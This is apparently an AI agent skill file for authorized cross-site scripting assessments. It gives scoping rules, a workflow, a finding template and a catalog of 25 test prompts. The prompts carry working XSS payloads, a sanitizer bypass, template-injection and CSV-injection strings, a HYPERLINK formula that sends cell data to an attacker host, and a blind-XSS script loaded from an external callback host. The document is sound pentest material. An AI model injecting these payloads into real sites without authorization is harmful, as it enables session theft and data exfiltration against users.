---
name: claude-xss-security-skill
description: Identify cross-site scripting where attacker-controlled input reaches an executable browser context.
---

# XSS security assessment

Identify cross-site scripting where attacker-controlled input reaches an executable browser context.

## Operating rules

- Work only against systems, applications, accounts, and repositories where explicit authorization and a defined test window exist.
- Prefer local fixtures, staging environments, synthetic records, and non-destructive canaries. Do not access, alter, exfiltrate, or persist real user data.
- Establish rate, concurrency, payload-size, and stop limits before testing. Stop immediately if availability, confidentiality, or integrity could be affected.
- Treat a suspected issue as unconfirmed until the request, response, execution/data-flow evidence, affected principal, and security impact are recorded.
- Never use weaponized payloads when a harmless marker or controlled callback can demonstrate the same behavior.
- Redact secrets and personal data in notes. Report remediation guidance and the exact authorization scope alongside findings.

## Assessment workflow

1. Define scope, identities, environment, test limits, and rollback contacts.
2. Inventory relevant endpoints, inputs, parsers, trust boundaries, and user roles.
3. Start with passive inspection and benign markers; compare behavior across roles, methods, encodings, and content types.
4. Use the category prompt catalog below as hypotheses, adapting payloads to safe canaries and the approved environment.
5. Capture reproducible evidence: timestamp, endpoint, method, sanitized request/response, actor, preconditions, observed result, and impact.
6. Validate fixes with regression tests, then document residual risk and monitoring recommendations.

## Finding format

- **Title / severity / confidence**
- **Affected asset and authorization context**
- **Preconditions and reproduction steps**
- **Sanitized evidence and source-to-sink or control-flow path**
- **Security impact and affected users/data**
- **Root cause**
- **Recommended remediation and regression test**

## Category-specific focus

Use the prompts below to guide a focused **XSS** review. Translate each hypothesis into a safe, authorized test and preserve the evidence needed to reproduce or remediate it.

## Prompt catalog

### 1. Reflected XSS in search bar

- **Difficulty:** EASY
- **Slug:** `reflected-xss-in-search-bar`
- **Source prompt:** Open the target URL. Find every search input on the page. For each one, first check whether the input enforces a max character limit on the client and server. If no length cap is enforced, submit the payload `"><svg/onload=alert(1)>` and report whether it reflects unescaped into the DOM. Capture request, response, and rendered HTML.

### 2. Stored XSS in profile fields

- **Difficulty:** MED
- **Slug:** `stored-xss-in-profile-fields`
- **Source prompt:** For every user-editable profile field (name, bio, website, location), submit `<img src=x onerror=alert(document.domain)>`. Re-render the profile both as the same user and as another user. Report which fields persist the payload and where it executes.

### 3. DOM XSS via URL fragment

- **Difficulty:** MED
- **Slug:** `dom-xss-via-url-fragment`
- **Source prompt:** Crawl all routes and grep client JS for sinks: `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `location`, `dangerouslySetInnerHTML`. For each sink, trace whether `location.hash` / `search` / `referrer` reaches it without sanitization. Report the source-to-sink path.

### 4. XSS via SVG upload

- **Difficulty:** MED
- **Slug:** `xss-via-svg-upload`
- **Source prompt:** Upload an SVG containing `<script>alert(1)</script>` to every file upload endpoint. After upload, fetch the file URL directly and report whether the `Content-Type` is `image/svg+xml` and whether script tags execute when opened in a browser.

### 5. XSS via PDF / HTML render

- **Difficulty:** HARD
- **Slug:** `xss-via-pdf-html-render`
- **Source prompt:** Test if uploaded PDFs or HTML files are served inline (no `Content-Disposition: attachment`) from the same origin. If so, craft a PDF with embedded JS and confirm execution in the app origin.

### 6. XSS via Markdown renderer

- **Difficulty:** MED
- **Slug:** `xss-via-markdown-renderer`
- **Source prompt:** Submit `[click](javascript:alert(1))`, `<details open ontoggle=alert(1)>`, and raw HTML to every markdown input. Report which payloads survive the sanitizer.

### 7. XSS via JSON content-type confusion

- **Difficulty:** HARD
- **Slug:** `xss-via-json-content-type-confusion`
- **Source prompt:** Find endpoints that echo JSON. Force them to return HTML by manipulating `Accept` headers or appending `?callback=` for JSONP. Inject script via the reflected parameter.

### 8. Mutation XSS in sanitizers

- **Difficulty:** HARD
- **Slug:** `mutation-xss-in-sanitizers`
- **Source prompt:** If the app uses DOMPurify or sanitize-html, test known mXSS payloads: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`. Report sanitizer version and bypass.

### 9. XSS via CSP bypass

- **Difficulty:** HARD
- **Slug:** `xss-via-csp-bypass`
- **Source prompt:** Read the `Content-Security-Policy` header. If it allows `unsafe-inline`, `unsafe-eval`, `*`, `data:`, or whitelists a JSONP endpoint (Google, etc.), craft a payload that satisfies the CSP and demonstrates execution.

### 10. XSS via error pages

- **Difficulty:** EASY
- **Slug:** `xss-via-error-pages`
- **Source prompt:** Trigger every error condition (404, 500, validation errors) with input like `<svg onload=alert(1)>` in path, query, headers (User-Agent, Referer). Check if error pages reflect input unescaped.

### 11. XSS in PostMessage handlers

- **Difficulty:** HARD
- **Slug:** `xss-in-postmessage-handlers`
- **Source prompt:** Find `window.addEventListener('message', ...)` handlers. Check if they validate `event.origin`. If not, send a crafted message from an attacker page and execute script in the target origin.

### 12. XSS via Angular/React template injection

- **Difficulty:** HARD
- **Slug:** `xss-via-angular-react-template-injection`
- **Source prompt:** If app uses Angular, inject `{{constructor.constructor('alert(1)')()}}` into bindings. For React, inject through `dangerouslySetInnerHTML` reachable inputs.

### 13. XSS via SVG `<use>` xlink:href

- **Difficulty:** HARD
- **Slug:** `xss-via-svg-use-xlink-href`
- **Source prompt:** Upload SVG with `<use xlink:href="data:image/svg+xml;base64,..."/>` referencing a payload-bearing SVG. Test if the inline-loaded SVG scripts execute.

### 14. XSS via filename reflection

- **Difficulty:** EASY
- **Slug:** `xss-via-filename-reflection`
- **Source prompt:** Upload a file named `"><img src=x onerror=alert(1)>.png`. Browse to any page that lists or previews uploads. Report filename reflection points.

### 15. XSS via HTTP header reflection

- **Difficulty:** MED
- **Slug:** `xss-via-http-header-reflection`
- **Source prompt:** Set `User-Agent`, `Referer`, `X-Forwarded-For` to `<script>alert(1)</script>` and visit each page. Check error pages, admin logs, dashboards for reflection.

### 16. XSS via email content

- **Difficulty:** MED
- **Slug:** `xss-via-email-content`
- **Source prompt:** Send emails (signup, password reset, invite) containing payload in display name / subject. Check rendered HTML in any inbox view the app exposes (admin, support).

### 17. XSS in CSV / Excel export

- **Difficulty:** EASY
- **Slug:** `xss-in-csv-excel-export`
- **Source prompt:** Inject `=cmd|'/C calc'!A1` and `=HYPERLINK("http://attacker/?"&A1)` into fields that get exported. Report CSV injection vectors.

### 18. XSS via redirect URL

- **Difficulty:** EASY
- **Slug:** `xss-via-redirect-url`
- **Source prompt:** Find every `?redirect=`, `?next=`, `?returnUrl=` parameter. Try `javascript:alert(1)` and `data:text/html,...`. Report which schemes are accepted.

### 19. Self-XSS escalated via CSRF

- **Difficulty:** HARD
- **Slug:** `self-xss-escalated-via-csrf`
- **Source prompt:** If a setting accepts XSS payload only from the user themselves, check if it can be set via CSRF (no token, weak SameSite). Combine to escalate.

### 20. XSS via WebSocket message echo

- **Difficulty:** MED
- **Slug:** `xss-via-websocket-message-echo`
- **Source prompt:** If the app uses WebSockets, send `<img src=x onerror=alert(1)>` messages and check whether other clients render them unescaped.

### 21. XSS via OAuth state parameter

- **Difficulty:** MED
- **Slug:** `xss-via-oauth-state-parameter`
- **Source prompt:** Set the `state` param in OAuth flows to an XSS payload. Check if the callback page reflects it on error.

### 22. Blind XSS in admin panels

- **Difficulty:** MED
- **Slug:** `blind-xss-in-admin-panels`
- **Source prompt:** Inject `<script src=//xss.report/c/yourid></script>` into every field that an admin or support agent might view (contact form, ticket, report abuse). Wait for callback.

### 23. XSS via charset confusion

- **Difficulty:** HARD
- **Slug:** `xss-via-charset-confusion`
- **Source prompt:** Set page charset to UTF-7 if possible, then inject `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`. Also test BOM, EBCDIC tricks.

### 24. XSS in PDF viewer query params

- **Difficulty:** HARD
- **Slug:** `xss-in-pdf-viewer-query-params`
- **Source prompt:** If the app uses pdf.js with `?file=` parameter, supply an XSS payload via the URL fragment or a malicious PDF URL.

### 25. XSS via clipboard paste handlers

- **Difficulty:** HARD
- **Slug:** `xss-via-clipboard-paste-handlers`
- **Source prompt:** Find paste event handlers that build HTML from clipboard. Test pasting an HTML fragment with active content into rich editors.

## Source attribution

- Source: [https://hackwithclaude.com/prompts](https://hackwithclaude.com/prompts)
- Retrieved: 2026-08-28
- Included prompts: 25

## Additional coverage

- Blind XSS in admin, support, log, and notification views.
- DOM clobbering and client-side template injection.
- Polyglot payload handling, event-handler contexts, and filter/canonicalization bypass.
- Impact assessment for affected roles and reachable actions, using only synthetic canaries.

### Source attribution

- Adapted from `SnailSploit/Claude-Red` `Skills/web/offensive-xss/SKILL.md`.
- Source repository: https://github.com/SnailSploit/Claude-Red
